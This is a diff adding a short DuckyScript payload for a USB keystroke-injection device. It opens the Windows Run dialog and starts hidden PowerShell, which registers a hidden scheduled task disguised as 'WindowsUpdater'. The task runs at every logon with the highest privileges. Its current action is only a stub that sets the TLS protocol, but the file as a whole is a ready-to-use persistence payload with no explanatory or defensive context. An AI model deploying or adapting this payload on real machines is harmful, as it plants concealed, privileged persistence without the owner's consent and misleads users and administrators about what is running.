@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -Command "& { $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command \"& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 }\"'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -Hidden; Register-ScheduledTask -TaskName 'WindowsUpdater' -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force }"
+ENTER
